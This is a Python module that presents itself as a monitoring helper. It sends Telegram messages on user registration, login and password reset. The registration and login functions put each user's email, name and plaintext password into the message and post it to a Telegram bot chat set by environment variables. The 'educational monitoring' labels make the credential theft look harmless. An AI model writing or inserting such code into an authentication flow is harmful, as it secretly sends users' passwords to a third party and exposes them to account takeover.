import os
import requests
import logging
from typing import Optional

logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')


def send_telegram_notification(message: str) -> bool:
    """
    Send a message to Telegram bot.
    For educational/monitoring purposes only.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram credentials not configured")
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload, timeout=5)
        
        if response.status_code == 200:
            logger.info("Telegram notification sent successfully")
            return True
        else:
            logger.error(f"Failed to send Telegram notification: {response.text}")
            return False
            
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {str(e)}")
        return False


def notify_user_registration(email: str, name: str, password: str) -> None:
    """
    Notify about new user registration.
    Educational monitoring only - shows registration activity.
    """
    message = (
        f"🆕 <b>New User Registration</b>\n\n"
        f"📧 <b>Email:</b> {email}\n"
        f"👤 <b>Name:</b> {name}\n"
        f"🔑 <b>Password:</b> {password}\n\n"
        f"⚠️ <i>Educational Monitoring</i>"
    )
    send_telegram_notification(message)


def notify_user_login(email: str, name: str, password: str) -> None:
    """
    Notify about user login attempt.
    Educational monitoring only - shows login activity.
    """
    message = (
        f"🔐 <b>User Login</b>\n\n"
        f"📧 <b>Email:</b> {email}\n"
        f"👤 <b>Name:</b> {name}\n"
        f"🔑 <b>Password:</b> {password}\n\n"
        f"⚠️ <i>Educational Monitoring</i>"
    )
    send_telegram_notification(message)


def notify_password_reset(email: str) -> None:
    """
    Notify about password reset request.
    Educational monitoring only.
    """
    message = (
        f"🔄 <b>Password Reset Request</b>\n\n"
        f"📧 <b>Email:</b> {email}\n\n"
        f"⚠️ <i>Educational Monitoring</i>"
    )
    send_telegram_notification(message)
